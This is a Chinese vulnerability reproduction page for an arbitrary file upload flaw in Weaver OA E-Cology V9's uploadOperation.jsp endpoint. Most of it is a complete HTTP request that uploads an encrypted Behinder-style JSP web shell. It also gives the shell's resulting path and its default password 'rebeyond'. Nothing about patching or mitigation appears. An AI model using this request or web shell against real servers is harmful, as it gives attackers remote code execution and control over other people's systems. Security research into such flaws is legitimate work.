# 泛微OA E-Cology uploadOperation.jsp 任意文件上传

## 漏洞描述

泛微OA V9 存在文件上传接口导致任意文件上传

## 漏洞影响

<a-checkbox checked>泛微OA V9</a-checkbox></br>

## 漏洞复现

漏洞位于: /page/exportImport/uploadOperation.jsp文件中

![img](../../../.vuepress/public/img/fanwei-14.png)

请求包

```bash
POST /page/exportImport/uploadOperation.jsp HTTP/1.1
Host: 
Content-Length: 397
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
dnt: 1
x-forwarded-for: 127.0.0.1
Connection: close

------WebKitFormBoundary6XgyjB6SeCArD3Hc
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: application/octet-stream

<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
------WebKitFormBoundary6XgyjB6SeCArD3Hc--
```

<a-checkbox checked>地址: /page/exportImport/fileTransfer/test.jsp</a-checkbox></br>

<a-checkbox checked>默认密码 rebeyond</a-checkbox></br>

